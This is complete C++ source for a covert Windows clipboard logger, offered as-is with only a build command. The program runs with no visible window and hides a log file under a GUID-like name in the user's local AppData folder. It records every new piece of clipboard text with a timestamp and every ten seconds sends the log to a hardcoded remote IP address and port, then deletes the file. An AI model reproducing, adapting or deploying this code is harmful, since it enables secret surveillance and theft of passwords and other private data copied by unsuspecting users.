//clipboard logger
//g++ -o cliplogger cliplogger.cpp -mwindows -lws2_32
#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <tlhelp32.h>
#include <cstring>
#include <winuser.h>
#include <ctime>
#include <process.h>

#define SIZE 1000000
#define FILE_NAME "{6CD3D31F-BEE8-481F-8EFD-F31F85D6D6F3}"
using namespace std;

DWORD32 WINAPI Connect_Server(LPVOID lpParam){
	while(1){
		Sleep(10000);
		WSADATA wsaData;
		SOCKET sock;
		SOCKADDR_IN serverAddr;
		char sendMSG[SIZE];
		int result;
		WSAStartup(MAKEWORD(2,2),&wsaData);
	
		sock=socket(PF_INET,SOCK_STREAM,0);
	
		memset(&serverAddr,0,sizeof(serverAddr));
		serverAddr.sin_family=AF_INET;
		serverAddr.sin_addr.s_addr=inet_addr("203.229.206.22");
		serverAddr.sin_port=htons(atoi("8814"));
	
		if(connect(sock,(SOCKADDR*)&serverAddr,sizeof(serverAddr))!=SOCKET_ERROR){
			FILE* fp=fopen(FILE_NAME,"r+");
			if(!fp){
				send(sock,"no file\n",strlen("no file\n"),0);
			}
			else{
				while(1){
					result=fread(sendMSG,sizeof(char),SIZE,fp);
					send(sock,sendMSG,result,0);
					if(feof(fp))break;
				}
			}
			fclose(fp);
			DeleteFile(FILE_NAME);
		}
		closesocket(sock);
		WSACleanup();
	}
}

DWORD32 WINAPI clip(LPVOID lpParam){
	char* last=NULL;
	last=(char*)malloc(sizeof(char)*3+1);
	strcpy(last,"***");
	while(1){
		Sleep(1000);
		OpenClipboard(0);
		if(IsClipboardFormatAvailable(CF_TEXT)||IsClipboardFormatAvailable(CF_OEMTEXT)){
			HANDLE hClipboard;
			hClipboard = GetClipboardData(CF_TEXT);
			char* data = (char*)GlobalLock(hClipboard);
			if(strcmp(data,last)!=0){
				free(last);
				FILE* fp = fopen(FILE_NAME,"a+");
				time_t t = time(NULL);
				struct tm tm = *localtime(&t);
				fprintf(fp, "=============%d-%d-%d %d:%d:%d=============\n", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
				fprintf(fp,"%s\n=======================================\n\n",data);
				fclose(fp);
				last=(char*)malloc(sizeof(char)*strlen(data)+1);
				strcpy(last,data);
			}
		}
		CloseClipboard();
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdPram, int nCmdShow){
	DWORD dwThreadId = 1;
	
	char path[100];
	strcpy(path,getenv("appdata"));
	strcat(path,"\\..\\Local");
	SetCurrentDirectory(path);
	
    HANDLE hThreadc = (HANDLE)_beginthreadex(NULL,0,clip,NULL,0,(DWORD32*)&dwThreadId);
	
    HANDLE hThreads = (HANDLE)_beginthreadex(NULL,0,Connect_Server,NULL,0,(DWORD32*)&dwThreadId);
	
	MSG Message;
	while(GetMessage(&Message,NULL,0,0)){
		DispatchMessage(&Message);
	}
	CloseHandle(hThreadc);
	return (int)Message.wParam;
}
